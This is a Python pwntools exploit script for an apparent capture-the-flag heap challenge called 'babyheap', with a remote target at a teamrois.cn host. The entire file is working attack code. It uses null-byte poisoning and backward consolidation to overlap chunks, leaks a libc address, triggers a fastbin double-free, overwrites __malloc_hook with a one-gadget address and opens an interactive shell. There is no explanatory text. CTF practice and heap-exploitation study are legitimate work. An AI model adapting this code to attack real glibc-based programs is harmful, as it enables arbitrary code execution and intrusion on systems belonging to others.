from pwn import *

def alloc(size, data):
	r.sendlineafter('choice: ','1')
	r.sendlineafter('size: ', str(size))

	if size > len(data):
		data += '\n'
	r.sendafter('content: ', data)
	return

def show(idx):
	r.sendlineafter('choice: ', '2')
	r.sendlineafter('index: ', str(idx))
	return

def free(idx):
	r.sendlineafter('choice: ', '3')
	r.sendlineafter('index: ', str(idx))
	return

def leak(idx):
	show(idx)
	r.recvuntil('content: ')
	return u64(r.recv(6).ljust(8, chr(0)))

def pwn():

	alloc(0xf0, p8(0x41)*0x80 + p8(0x90)) # 0
	
	alloc(0x80, 'B'*8) # 1
	alloc(0x68, 'C'*8) # 2
	alloc(0xf0, 'D'*8) # victim chunk
	alloc(0x68, 'E'*8) # 4

	free(1)
	free(0)
	# Free chunk #2, allocate it back and null poison
	free(2)

	alloc(0x68, p64(0xb00bface) * (0x60/8) + p64(0x200))

	# Bakcward consolidate
	free(3)

	# Overlap a remainder chunk with the already in-use chunk #0
	alloc(0x190/2, p64(0xb00bface))
	alloc(0x190/2 - 0x10, p64(0xb00bface))
	
	libc        = leak(0) - 0x3c4b78
	malloc_hook = libc + 0x3c4b10 - 0x30 + 0xd
	magic       = libc + 0x4526a
	
	log.success('Libc: 0x{:x}'.format(libc))

	# chunk #0 will be placed at different index in the ptr array
	# enabling us to double-free it afterwards
	alloc(0x68, p64(0xb00bface))

	# Trigger double-free
	free(0)
	free(4)
	free(3)

	# Fastbin attack
	alloc(0x68, p64(malloc_hook))
	alloc(0x68, p64(0xb00bface))
	alloc(0x68, p64(0xb00bface))
	alloc(0x68, 'A'*0x13 + p64(magic))

	r.sendlineafter('choice: ','1')
	r.sendlineafter('size: ', str(0x68))

	r.interactive()

if __name__ == "__main__":
    if sys.argv[1] == "r":
        r = remote('babyheap.2018.teamrois.cn', 3154)
        pwn()
    else:
        r = process('./babyheap')
        pause()
        pwn()
